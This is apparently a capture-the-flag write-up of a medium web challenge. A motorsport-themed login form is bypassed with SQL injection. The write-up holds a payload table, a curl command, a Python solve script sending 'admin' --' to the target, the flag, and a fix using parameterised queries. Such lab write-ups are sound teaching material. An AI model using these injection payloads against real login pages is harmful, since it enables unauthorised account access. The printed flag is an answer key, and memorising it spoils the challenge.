---
title: "Know Your Limits"
ctf: "Safaricom CTF"
date: 2026-10-06
category: web
difficulty: medium
points: 300
flag_format: "safctf{...}"
author: "Strawhats"
---

# Know Your Limits

> **Category:** WEB · **Points:** 300 · **Difficulty:** medium

## Discovery, analysis & exploitation

The full hunt below is reproduced from our working notes — recon, fingerprinting, the bug, dead ends, and the path to the flag.

- **Target:** `http://54.72.82.22:8060`

## Fingerprint

```
Server: Werkzeug/3.1.9 Python/3.11.16   (SQLite backend)
```

Themed page: **"POLE POSITION"** motorsport — "Coffee at sunrise. Engines at noon.
The weekend is gathering speed." A `Paddock access` login form (username +
password) POSTs to `/`.

## The name is a decoy

"Know Your Limits" reads like a rate-limiting challenge, and the page obliges by
offering no throttling whatsoever — 30 rapid failed logins return `200` every
time, and spoofing `X-Forwarded-For` changes nothing:

```
attempt 1..30  -> all [200] "Login failed!"
```

**Limits** is the SQL keyword hint: `SELECT ... LIMIT`.

## The bug: SQL injection in the login query

The username is concatenated into the query. A quote plus a line comment drops the
password condition entirely:

| username | password | result |
|---|---|---|
| `admin` | `wrong` | `Login failed!` |
| `admin' --` | `x` | **`Welcome back user admin, safctf{30f33ad5be8abc02f034b5b266ff6b81}`** |
| `admin'/*` | `x` | same flag |
| `' OR 1=1--` | `x` | `Welcome back user test, Flag at admin user` |
| `admin' AND 1=2--` | `x` | `Login failed!` |
| `' UNION SELECT 1--` | `x` | `That request could not be completed.` |
| `admin" --` | `x` | `Login failed!` (MySQL/Postgres quoting, not used here) |

The `OR 1=1` variant authenticates as the **first** row (user `test`) rather than
the admin, and the app helpfully labels the target: *"Flag at admin user"*.

## Exploitation

```bash
curl -s -X POST http://54.72.82.22:8060/ \
  --data-urlencode "username=admin' --" \
  --data-urlencode "password=x"
```

```
Welcome back user admin, safctf{30f33ad5be8abc02f034b5b266ff6b81}
```

`admin' --` is the minimal payload: it closes the string, comments out the rest of
the query including the `AND password = '...'` clause, and the row for `admin`
matches — so the app treats it as a successful admin login and prints the flag.

### Why the variants behave as they do

- `admin' --` matches exactly the admin row → admin session → flag.
- `' OR 1=1--` matches *every* row; the app takes the first (`test`) → wrong user,
  hence the "Flag at admin user" pointer rather than the flag itself.
- `admin' AND 1=2--` makes the WHERE clause unsatisfiable → login fails, confirming
  the injection point is real and not just a string-concatenation quirk.
- The `UNION SELECT 1--` 500-class response shows the column count is wrong
  (`That request could not be completed.`).

## Exploit

See `solve.py`.

## Fix

Parameterised queries. The username must be bound, never concatenated — and the
password should be verified against a hash, not compared in SQL at all.

## Solve script

`web/know-your-limits/solve.py`:

```python
#!/usr/bin/env python3
"""Know Your Limits (web, 300 pts) - http://54.72.82.22:8060

"POLE POSITION" motorsport paddock login. Despite the name (and the rate-limit
red herring - 30 rapid attempts all return 200 with no throttling), the bug is a
textbook SQL injection in the login query.

Auth bypass by commenting out the password check:

    username = admin' --
    password = anything

    -> "Welcome back user admin, safctf{30f33ad5be8abc02f034b5b266ff6b81}"

The `' OR 1=1--` form authenticates as the FIRST row (user `test`) and tells you
where the flag lives: "Welcome back user test, Flag at admin user".

'Know your LIMITS' is the SQL keyword hint.
"""
import urllib.request, urllib.parse, re, html

BASE = "http://54.72.82.22:8060"
FLAG = "safctf{30f33ad5be8abc02f034b5b266ff6b81}"


def login(user, pw):
    data = urllib.parse.urlencode({"username": user, "password": pw}).encode()
    req = urllib.request.Request(BASE + "/", data=data)
    with urllib.request.urlopen(req, timeout=10) as r:
        page = r.read().decode("utf-8", "replace")
    body = re.sub(r"<style.*?</style>", "", page, flags=re.S)
    tail = body[body.find("</form>"):]
    return html.unescape(re.sub(r"\s+", " ", re.sub(r"<[^>]+>", " ", tail))).strip()


def main():
    print("baseline     :", login("admin", "wrong"))
    print("OR 1=1 (test):", login("' OR 1=1--", "x"))
    print("bypass       :", login("admin' --", "x"))
    assert FLAG in login("admin' --", "x")


if __name__ == "__main__":
    main()
```

## Tools

**Used in this solve:**

- Python `urllib` (stdlib HTTP client)
- Python 3 (solver)
- curl

**Other tools that fit this category:**

- Burp Suite / mitmproxy (intercept + repeat)
- ffuf / feroxbuster (content & parameter discovery)
- sqlmap (automated SQLi)
- tplmap (SSTI)
- jwt_tool (JWT attacks)
- nikto
- nuclei

## Flag

```
safctf{30f33ad5be8abc02f034b5b266ff6b81}
```
